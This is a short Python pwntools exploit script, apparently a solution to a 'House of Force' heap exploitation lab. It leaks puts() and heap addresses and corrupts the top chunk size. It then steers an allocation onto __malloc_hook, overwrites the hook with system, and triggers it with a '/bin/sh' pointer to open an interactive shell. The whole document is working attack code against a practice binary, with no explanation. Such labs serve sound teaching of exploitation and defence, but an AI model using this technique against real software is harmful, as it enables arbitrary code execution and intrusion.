from pwn import *

#context.log_level = 'debug' 

elf = context.binary = ELF('house_of_force')
libc = ELF(elf.runpath + b'/libc.so.6')

def malloc(size,data):
	io.recvuntil(b'> ')	
	io.sendline(b'1')
	io.recvuntil(b'size: ')
	io.sendline(f'{size}'.encode())
	io.recvuntil(b'data: ')
	io.sendline(data)

# distance between two address.
def delta(x,y):
	return (0xffffffffffffffff - x) + y

io = process(elf.path)

# Storing puts address.
io.recvuntil(b"puts() @ ")
puts_addr = int(io.recvline(), 16)

# Libc addr
libc.address = puts_addr - libc.sym.puts

# Storing heap address.
io.recvuntil('heap @ ')
heap_addr = int(io.recvline(), 16)
io.timeout = 0.1


log.info(f'Puts addr: {puts_addr}')
log.info(f'Heap addr: {heap_addr}')


malloc(24,b'/bin/sh\0' + b'A'* 16 + p64(0xffffffffffffffff))
malloc((libc.sym.__malloc_hook - 0x20) - (heap_addr + 0x20), b'Y')

malloc(24, p64(libc.sym.system))

io.sendline("1")
io.recvuntil("size: ")
io.sendline(str(heap_addr+0x10))
#io.sendline(str(next(libc.search(b'/bin/sh'))))
#io.recvuntil("data: ")
#io.sendline(b"")


io.interactive()